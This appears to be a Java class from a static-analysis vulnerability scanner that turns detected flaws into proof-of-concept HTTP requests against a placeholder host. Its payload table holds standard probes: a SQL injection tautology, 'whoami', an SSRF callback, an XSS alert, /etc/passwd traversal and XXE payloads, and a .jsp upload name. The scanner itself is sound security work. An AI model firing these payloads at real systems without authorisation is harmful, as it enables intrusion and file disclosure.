package com.jbytescanner.report;

import com.jbytescanner.model.ApiRoute;
import com.jbytescanner.model.Vulnerability;
import soot.*;
import soot.jimple.StringConstant;

import java.util.*;
import java.util.stream.Collectors;

public class PoCGenerator {

    private static final String HOST_PLACEHOLDER = "{{TARGET_HOST}}";
    
    // Payloads
    private static final Map<String, String> PAYLOADS = new HashMap<>();
    static {
        PAYLOADS.put("sqli", "' OR '1'='1");
        PAYLOADS.put("rce", "whoami"); // Or calc
        PAYLOADS.put("ssrf", "http://dnslog.cn");
        PAYLOADS.put("xss", "<script>alert(1)</script>");
        PAYLOADS.put("path-traversal", "../../../../etc/passwd");
        PAYLOADS.put("deserialization", "{{SERIALIZED_PAYLOAD}}");
        PAYLOADS.put("xxe", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>");
        PAYLOADS.put("default", "{{PAYLOAD}}");
    }

    public String generate(Vulnerability vuln, ApiRoute route) {
        if (route == null) return "No Route Found for Vulnerability in " + vuln.getSourceMethod();

        StringBuilder poc = new StringBuilder();
        
        // 1. Request Line
        poc.append(route.getHttpMethod()).append(" ").append(adjustPath(route)).append(" HTTP/1.1\n");
        
        // 2. Headers
        poc.append("Host: ").append(HOST_PLACEHOLDER).append("\n");
        poc.append("User-Agent: JByteScanner/1.0\n");
        poc.append("Content-Type: ").append(route.getContentType()).append("\n");
        poc.append("Accept: */*\n");
        
        // Add Auth Header Placeholder if likely protected
        // (Simple heuristic: if path contains /admin or /private)
        if (route.getPath().contains("/admin") || route.getPath().contains("/private")) {
             poc.append("Authorization: Bearer {{TOKEN}}\n");
        }
        
        poc.append("\n"); // End of Headers

        // 3. Body
        String payload = getPayload(vuln.getType());
        String body = generateBody(route, payload);
        
        poc.append(body);
        
        return poc.toString();
    }

    private String getPayload(String vulnType) {
        String key = vulnType.toLowerCase();
        if (key.contains("sql")) return PAYLOADS.get("sqli");
        if (key.contains("exec") || key.contains("command") || key.contains("rce")) return PAYLOADS.get("rce");
        if (key.contains("ssrf")) return PAYLOADS.get("ssrf");
        if (key.contains("xss")) return PAYLOADS.get("xss");
        if (key.contains("path") || key.contains("file")) return PAYLOADS.get("path-traversal");
        if (key.contains("deserialize")) return PAYLOADS.get("deserialization");
        if (key.contains("xml") || key.contains("xxe")) return PAYLOADS.get("xxe");
        return PAYLOADS.get("default");
    }

    private String adjustPath(ApiRoute route) {
        String path = route.getPath();
        // Replace PathVariables {id} with placeholders
        if (path.contains("{")) {
            path = path.replaceAll("\\{[^}]+\\}", "123"); 
        }
        return path;
    }

    private String generateBody(ApiRoute route, String payload) {
        String contentType = route.getContentType();
        if (contentType == null) contentType = "application/x-www-form-urlencoded";
        
        if (contentType.contains("json")) {
            return generateJsonBody(route, payload);
        } else if (contentType.contains("form-urlencoded")) {
            return generateFormBody(route, payload);
        } else if (contentType.contains("multipart")) {
            return generateMultipartBody(route, payload);
        }
        
        return "";
    }

    private String generateFormBody(ApiRoute route, String payload) {
        List<String> params = route.getParameters();
        if (params == null || params.isEmpty()) return "";

        List<String> pairs = new ArrayList<>();
        for (String param : params) {
            // param format: "arg0:type" or "name:type"
            String[] parts = param.split(":");
            String name = parts[0];
            // Only inject payload into String types ideally, but for now inject everywhere
            pairs.add(name + "=" + payload);
        }
        return String.join("&", pairs);
    }

    private String generateMultipartBody(ApiRoute route, String payload) {
        StringBuilder sb = new StringBuilder();
        String boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
        
        List<String> params = route.getParameters();
        if (params != null) {
            for (String param : params) {
                String[] parts = param.split(":");
                String name = parts[0];
                String type = parts.length > 1 ? parts[1] : "";

                sb.append("--").append(boundary).append("\n");
                
                if (type.contains("MultipartFile")) {
                    sb.append("Content-Disposition: form-data; name=\"").append(name).append("\"; filename=\"test.jsp\"\n");
                    sb.append("Content-Type: application/octet-stream\n\n");
                    sb.append(payload).append("\n");
                } else {
                    sb.append("Content-Disposition: form-data; name=\"").append(name).append("\"\n\n");
                    sb.append(payload).append("\n");
                }
            }
        }
        sb.append("--").append(boundary).append("--");
        return sb.toString();
    }

    private String generateJsonBody(ApiRoute route, String payload) {
        // Find @RequestBody parameter
        String requestBodyType = null;
        
        if (route.getParamAnnotations() != null) {
            for (Map.Entry<String, String> entry : route.getParamAnnotations().entrySet()) {
                if ("RequestBody".equals(entry.getValue())) {
                    // Find type from parameter list
                    String paramName = entry.getKey(); // e.g., arg0
                    for (String p : route.getParameters()) {
                        if (p.startsWith(paramName + ":")) {
                            requestBodyType = p.split(":")[1];
                            break;
                        }
                    }
                }
            }
        }

        if (requestBodyType == null) return "{}";

        // Generate JSON structure for this type
        return generateJsonForType(requestBodyType, payload, 0);
    }

    private String generateJsonForType(String typeName, String payload, int depth) {
        if (depth > 3) return "\"...\""; // Prevent infinite recursion

        // Remove array brackets for class lookup
        String baseType = typeName.replace("[]", "");
        boolean isArray = typeName.endsWith("[]");

        if (isPrimitiveOrWrapper(baseType)) {
             return isArray ? "[\"" + payload + "\"]" : "\"" + payload + "\"";
        }

        // Try to find SootClass
        if (Scene.v().containsClass(baseType)) {
            SootClass sc = Scene.v().getSootClass(baseType);
            
            // If it's a Map or List/Collection, return generic structure
            if (isCollection(sc)) return "[\"" + payload + "\"]";
            if (isMap(sc)) return "{\"key\": \"" + payload + "\"}";

            // If it's a POJO, iterate fields
            StringBuilder json = new StringBuilder();
            json.append(isArray ? "[{" : "{");
            
            List<String> fieldsJson = new ArrayList<>();
            // Only non-static fields
            // Force resolution if phantom?
            if (sc.isPhantom()) {
                return "{\"error\": \"phantom_class\"}";
            }
            
            try {
                for (SootField field : sc.getFields()) {
                    if (!field.isStatic()) {
                        String fieldName = field.getName();
                        String fieldType = field.getType().toString();
                        
                        // Heuristic: Inject payload into String fields, use default for others
                        String value;
                        if (fieldType.equals("java.lang.String")) {
                            value = "\"" + payload + "\"";
                        } else if (isPrimitive(fieldType)) {
                            value = "0"; // Don't break type parsing with string payload
                        } else {
                            // Recursive generation
                            value = generateJsonForType(fieldType, payload, depth + 1);
                        }
                        
                        fieldsJson.add("\"" + fieldName + "\": " + value);
                    }
                }
            } catch (Exception e) {
                 return "{}";
            }
            
            json.append(String.join(", ", fieldsJson));
            json.append(isArray ? "}]" : "}");
            return json.toString();
        }

        return "{}";
    }

    private boolean isPrimitive(String type) {
        return type.equals("int") || type.equals("boolean") || type.equals("long") || 
               type.equals("double") || type.equals("float") || type.equals("short") || type.equals("byte");
    }

    private boolean isPrimitiveOrWrapper(String type) {
        return isPrimitive(type) || type.startsWith("java.lang.");
    }

    private boolean isCollection(SootClass sc) {
        // Simple hierarchy check
        SootClass current = sc;
        while (current.hasSuperclass()) {
             if (current.getName().equals("java.util.Collection") || current.getName().equals("java.util.List") || current.getName().equals("java.util.Set")) return true;
             if (current.getName().equals("java.lang.Object")) break;
             current = current.getSuperclass();
        }
        // Also check interfaces
        for (SootClass iface : sc.getInterfaces()) {
            if (iface.getName().equals("java.util.Collection")) return true;
        }
        return false;
    }

    private boolean isMap(SootClass sc) {
        for (SootClass iface : sc.getInterfaces()) {
            if (iface.getName().equals("java.util.Map")) return true;
        }
        // Check superclass
        SootClass current = sc;
        while(current.hasSuperclass()) {
             if (current.getName().equals("java.util.Map") || current.getName().equals("java.util.AbstractMap")) return true;
             if (current.getName().equals("java.lang.Object")) break;
             current = current.getSuperclass();
        }
        return false;
    }
}
